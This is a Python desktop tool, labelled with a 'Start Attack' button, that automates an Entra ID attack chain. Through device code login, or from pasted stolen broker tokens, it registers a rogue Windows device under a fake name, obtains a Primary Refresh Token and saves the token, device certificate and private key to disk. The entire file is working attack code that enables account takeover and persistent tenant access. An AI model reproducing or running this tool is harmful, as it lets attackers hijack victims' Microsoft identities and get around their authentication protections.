import sys
import json
import threading
import random
import string
import base64
import qdarkstyle
import requests

from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QLabel, QPushButton, QTextEdit, QLineEdit
)

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from msal import PublicClientApplication

# ---- External dependencies you need to define ----
from roadtools.roadlib.auth import Authentication, WELLKNOWN_CLIENTS, WELLKNOWN_RESOURCES
from roadtools.roadtx.selenium import SeleniumAuthentication
from roadtools.roadlib.deviceauth import DeviceAuthentication


class DeviceCode2WFH(QWidget, Authentication, DeviceAuthentication):
    def __init__(self, ts_client=None, parent_dashboard=None):
        super().__init__()
        self.ts_client = ts_client
        self.parent_dashboard = parent_dashboard
        self.setWindowTitle("DeviceCode2WinHelloForBusiness")
        self.resize(800, 720)

        Authentication.__init__(self, username=None, password=None, tenant=None,
                                client_id=WELLKNOWN_CLIENTS["broker"])
        DeviceAuthentication.__init__(self, auth=self)
        self.refresh_token = None
        self.access_token = None
        self.custom_device_name = None

        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Access Token (optional):"))
        self.access_input = QTextEdit()
        self.access_input.setPlaceholderText("Paste Access Token for Microsoft Authentication Broker here to skip Device Code login...")
        layout.addWidget(self.access_input)

        layout.addWidget(QLabel("Refresh Token (optional):"))
        self.refresh_input = QTextEdit()
        self.refresh_input.setPlaceholderText("Paste Refresh Token for Microsoft Authentication Broker here to skip Device Code login...")
        layout.addWidget(self.refresh_input)

        layout.addWidget(QLabel("Custom Device Name (optional):"))
        self.device_name_input = QLineEdit()
        self.device_name_input.setPlaceholderText("e.g. WFH-LAPTOP01")
        layout.addWidget(self.device_name_input)

        self.start_button = QPushButton("Start Attack")
        self.start_button.clicked.connect(self.start_thread)
        layout.addWidget(self.start_button)

        layout.addWidget(QLabel("DeviceCode2WFH Output"))
        self.output_box = QTextEdit()
        self.output_box.setReadOnly(True)
        layout.addWidget(self.output_box)

        self.setLayout(layout)

    def log_msg(self, text):
        self.output_box.append(text)
        self.output_box.verticalScrollBar().setValue(self.output_box.verticalScrollBar().maximum())

    def start_thread(self):
        threading.Thread(target=self.automate_flow, daemon=True).start()

    def get_device_code_interactive(self):
        app = PublicClientApplication(
            client_id=WELLKNOWN_CLIENTS["broker"],
            authority="https://login.microsoftonline.com/common"
        )
        flow = app.initiate_device_flow(scopes=["urn:ms-drs:enterpriseregistration.windows.net/.default"])
        if "user_code" not in flow:
            self.log_msg("❌ Failed to start device code flow.")
            return None

        self.log_msg("[✔] Device Code Flow initiated.")
        self.log_msg(f"➡ Visit: {flow['verification_uri']}")
        self.log_msg(f"➡ Code:  {flow['user_code']}\n")

        result = app.acquire_token_by_device_flow(flow)
        return {
            "refreshToken": result.get("refresh_token"),
            "accessToken": result.get("access_token"),
            "id_token": result.get("id_token")
        }

    def automate_flow(self):
        self.refresh_token = self.refresh_input.toPlainText().strip()
        self.access_token = self.access_input.toPlainText().strip()
        self.custom_device_name = self.device_name_input.text().strip()

        if not self.refresh_token or not self.access_token:
            self.log_msg("[*] Starting device code flow...")
            data = self.get_device_code_interactive()
            if not data:
                self.log_msg("❌ Device code flow failed.")
                return
            self.refresh_token = data.get("refreshToken")
            self.access_token = data.get("accessToken")
            self.log_msg(f"[✔] Got Refresh Token:\n{self.refresh_token}\n")
            self.log_msg(f"[i] Access Token:\n{self.access_token}\n")

        self.resource_uri = WELLKNOWN_RESOURCES["devicereg"]
        self.log_msg("[*] Getting device registration token...")
        tok = self.authenticate_with_refresh_native(self.refresh_token, client_secret=self.password)
        if not tok:
            self.log_msg("❌ Failed to get device registration token.")
            return

        self.log_msg("[*] Registering device...")
        certpem, privkey, device_name = self.register_device_wrapper(tok["accessToken"])
        self.loadcert_in_mem(certpem, privkey)
        self.log_msg(f"[✔] Device registered and cert loaded.\nDevice Name: {device_name}\n")
        self.log_msg(f"Device Certificate:\n{certpem.decode()}")

        self.log_msg("[*] Requesting PRT...")
        prt = self.get_prt_with_refresh_token(self.refresh_token)
        if prt:
            self.saveprt(prt, prtfile="quetzal.prt")
            self.setprt(prt["refresh_token"], prt['session_key'])
            self.log_msg("[✔] Got PRT!")
            self.log_msg(f"PRT Data:\n{json.dumps(prt, indent=2)}")
        else:
            self.log_msg("❌ Failed to get PRT.")

    def register_device_wrapper(self, access_token, jointype=0):
        device_name = self.custom_device_name or 'DESKTOP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

        csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "7E980AD9-B86D-4306-9425-9AC066FB014A"),
        ])).sign(key, hashes.SHA256())

        certreq = csr.public_bytes(serialization.Encoding.DER)
        certbytes = base64.b64encode(certreq)
        pubkeycngblob = base64.b64encode(self.create_pubkey_blob_from_key(key))

        data = {
            "CertificateRequest": {
                "Type": "pkcs10",
                "Data": certbytes.decode("utf-8")
            },
            "TransportKey": pubkeycngblob.decode("utf-8"),
            "TargetDomain": "quetzalcoatl.cloud",
            "DeviceType": "Windows",
            "OSVersion": "10.0.19041.928",
            "DeviceDisplayName": device_name,
            "JoinType": jointype,
            "attributes": {
                "ReuseDevice": "true",
                "ReturnClientSid": "true"
            }
        }

        headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json"
        }

        res = requests.post(
            "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0",
            json=data, headers=headers, proxies=self.proxies, verify=self.verify
        )
        returndata = res.json()

        cert = x509.load_der_x509_certificate(base64.b64decode(returndata["Certificate"]["RawBody"]))
        certpem = cert.public_bytes(serialization.Encoding.PEM)

        privkey = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        )

        with open("device_cert.pem", "wb") as f:
            f.write(certpem)
        with open("device_key.key", "wb") as f:
            f.write(privkey)

        return certpem, privkey, device_name

    def loadcert_in_mem(self, pemfile, privkey):
        self.certificate = x509.load_pem_x509_certificate(pemfile)
        self.transportkeydata = self.keydata = privkey
        self.transportprivkey = self.privkey = serialization.load_pem_private_key(self.keydata, password=None)


# ---- Entry point for the script ----
def main():
    app = QApplication(sys.argv)
    app.setStyleSheet(qdarkstyle.load_stylesheet())

    window = DeviceCode2WFH()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
